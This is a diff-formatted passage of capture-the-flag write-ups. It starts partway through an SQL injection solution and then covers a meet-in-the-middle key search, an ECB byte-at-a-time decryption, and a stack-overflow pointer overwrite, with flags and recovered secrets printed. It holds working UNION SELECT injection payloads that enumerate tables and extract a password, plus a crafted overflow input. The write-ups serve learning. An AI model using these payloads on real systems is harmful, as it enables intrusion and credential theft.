+id=0 UNION SELECT 1		(no result)
+id=0 UNION SELECT 1,2		(no result)
+id=0 UNION SELECT 1,2,3		(no result)
+...
+id=0 UNION SELECT 1,2,3,4,5,6	(no result)
+id=0 UNION SELECT 1,2,3,4,5,6,7	(Result! We now know that the table contains 7 columns)
+
+Let's try replacing one of the numbers (that appear in the page as a result, as not all columns are shown) by password:
+id=0 UNION SELECT 1,2,3,4,5,6,password from users WHERE id=1	(no result)
+
+After looking a bit closer at the source code, we see that the table isn't named "users", but "${table_prefix}users". They are hiding the actual table name, so we need to find that first.
+
+We know it's a mysql database (from the function mysqli_real_escape_string), so a little Googling can tell us that there is a table (information_schema.tables) that contains information on all other tables. This table contains a column table_name and a column table_rows (self-explanatory). Assuming our users-table has a unique number of rows, we can find it by asking for the names of tables with different number of rows:
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables WHERE table_rows=1	(no result)
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables WHERE table_rows=2	(no result)
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables WHERE table_rows=3	(no result)
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables WHERE table_rows=4	(Result! Our table is called "super_secret_users".)
+
+Now, I got lucky here that there wasn't another table with 4 rows, or this wouldn't have worked. A better way to do this, is to use "LIMIT 1 OFFSET x". Adding this at the end allows us to have exactly 1 result and even choose which one we want. This took a little longer, but could easily be automated in a script.
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables LIMIT 1 OFFSET 0	(result: CHARACTER_SETS)
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables LIMIT 1 OFFSET 1	(result: COLLATIONS)
+...
+id=0 UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables LIMIT 1 OFFSET 40	(result: super_secret_users)
+COLLATIONS
+
+Now that we know the right table, we can get our password:
+id=0 UNION SELECT 1,2,3,4,5,6,password from super_secret_users WHERE id=1	(result: password = not_the_flag_super_secret_admin_password)
+
+Log in with that password and we get the flag: flag_2tc7ZPa5PEhcyZJXgH	
+-------------------------------
+Block - 130
+
+In this challenge, we get an encryption script and and encrypted message. The goal is to find the 2 keys that created the message and decrypt it.
+
+After having a quick look at the encryption script, the first thing I did was get a feel for how it worked from a black-box perspective. I create a file called "in" (contents was "aaa") and encrypted it into a file called "out" with the keys 0 and 0. (For this I created the read.py script to be able to easily read the output hex-encoded.) After experimenting a bit with different input sizes and content, I was able to notice some things about the output (especially output size). The most important thing was that each output began with the same data: "ae6b321e5149dba60d". We can also get this by encrypting an empty message with the same keys. If we look at bit more closely at the encryption script, we can see that it adds "message: " (9 characters long) to the beginning of all input data it encrypts. This means that first 9 bytes of the encrypted message also correspond to this header. We now have a pair of matching plain text and cipher text that we can use to find the keys.
+
+If 'e' is our encryption function, 'k1' and 'k2' our keys,'c' our cipher text, and 'm' our original message:
+c = e( e(m, k1), k2)
+
+The naive approach to this problem would be to bruteforce all possible combinations of keys until we find one that encrypts "message: " to the first 9 bytes of our encrypted message. Because we have 2 keys, each consisting of maximum 6 hexadecimal characters (=up to 16**6 possible values), we would need to test up to 16**12 possible cases (of the order of 10**14).
+
+A better approach would be to use a so-called "meet-in-the-middle" attack. Here, we try each to find the keys k1 and k2, so that k1 encrypts m to the same thing that k2 decrypts c to:
+d(c, k2) = e(m, k1)
+Because we now only need to try each possible key 2 times (1 encryption, 1 decryption), there are only 2*(16**6) operations needed (of the order of 10**7). This is, of course, a lot faster than the naive solution.
+
+I wrote a script (find_key.py) that iteratively encrypts m and decrypts c and adds them an encryption/decryption dictionary together with the key k_i:
+t1_i = e(m, k_i)
+t2_i = d(c, k_i)
+If at some point, t1 equals a value that is present in the decryption dictionary (or a t2 that's in the encryption dictionary), we have found the correct keys:
+t1_i = e(m, k_i)
+t2_j = d(c, k_j)
+if t1_i == t2_j, then k_i = k1 and k_j = k2
+After about 25 minutes, I get this output: 
+"encryption key: 4429993, decryption key: 7744557"
+
+Once we have k1 and k2, all we need to do is decrypt the encrypted message and we get our message: 
+"message: 4edd1450fbebdc22893c44fbbbadda"
+-------------------------------
+Web Interception - 140
+
+The service for this challenge will take your input, add some known data to the beginning and some secret data to the end, and send you the encrypted result. The goal is to determine the secret data.
+
+This is how the response is created:
+response = encrypt("GET /" + input + secret data)
+
+The weakness here lies in the fact that the data gets chopped into fixed-length blocks (16 bytes or 32 hexadecimal characters), which are individually encrypted, and then reassembled. This called ECB-mode. After trying a little input, we know that sending 27 times "00" leads to this data being encrypted (where 'x' is an unknown hexadecimal character):
+474554202f0000000000000000000000 00000000000000000000000000000000 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Because we control the number of "00"s that are send, we can single out the first "xx", by sending one "00" less (where '?' stands for padding):
+474554202f0000000000000000000000 000000000000000000000000000000xx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx??
+
+We now have the encrypted block that corresponds to "000000000000000000000000000000xx". At this point, we can try to guess this "xx", by brute-forcing it (only 256 cases):
+474554202f0000000000000000000000 00000000000000000000000000000000 00000000000000000000000000000001 00000000000000000000000000000002 00000000000000000000000000000003 00000000000000000000000000000004 00000000000000000000000000000005 00000000000000000000000000000006 00000000000000000000000000000007 00000000000000000000000000000008 00000000000000000000000000000009 0000000000000000000000000000000a 0000000000000000000000000000000b 0000000000000000000000000000000c 0000000000000000000000000000000d (etc.) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+We now have the encrypted version of all the possible values and need to matche it to the one we got earlier. In this case, the first "xx" was "20".
+Note: Each message can only be used to encrypt 45 blocks, so we need to send several messages to get all 256 possibilities.
+
+We can now repeat the same procedure, because we know the first secret byte. We just send one "00" less:
+474554202f0000000000000000000000 000000000000000000000000000020xx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxx????
+After brute-forcing the possible values for "000000000000000000000000000020xx", we get the next secret byte (48).
+
+The complete secret data is: "20485454502f312e310d0a436f6f6b69653a20666c61673d636f6e67726174735f6f6e5f796f75725f66697273745f6563625f64656372797074696f6e0d0a01"
+... which contains: "Cookie: flag=congrats_on_your_first_ecb_decryption"
+-------------------------------
+What The Flag - 140
+
+This challenge has an interactive page that lets you see the stack, based on your input. Quite useful, but if you know how the use gdb, you can have this for all challenges.
+
+This time, there are stack canaries, which prevent you from overwriting the return address. Make your input too long and the program will notice there's a stack overflow and will terminate. The goal here is to overwrite some data that's saved on the stack. The input is supposed to be a password, but by tacking on some extra bytes at the end, we can overwrite the pointer of the filename it reads from.
+
+The password itself is written pretty clearly in the source code, but what's harder is finding a way to make it open the right file. Luckily, the file the program reads from by default, is called "not_the_flag.txt", which contains the substring "flag.txt". If we can tell the program to start reading the filename 8 bytes further, it will our flag file.
+
+The original pointer for the filename is 0x08048477. This means that reading from 0x0804847f returns "flag.txt". So our input will be: password + null bytes + 2 garbage bytes + new pointer (and an extra null byte that gets added by default). Don't forget little endian, so reverse the order of the pointer address!
+
+Winning input: 1337_P455W0RD\x00\x00\x00\x7f\x87\x04\x08
+Flag: who_needs_%eip
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+-------------------------------
+
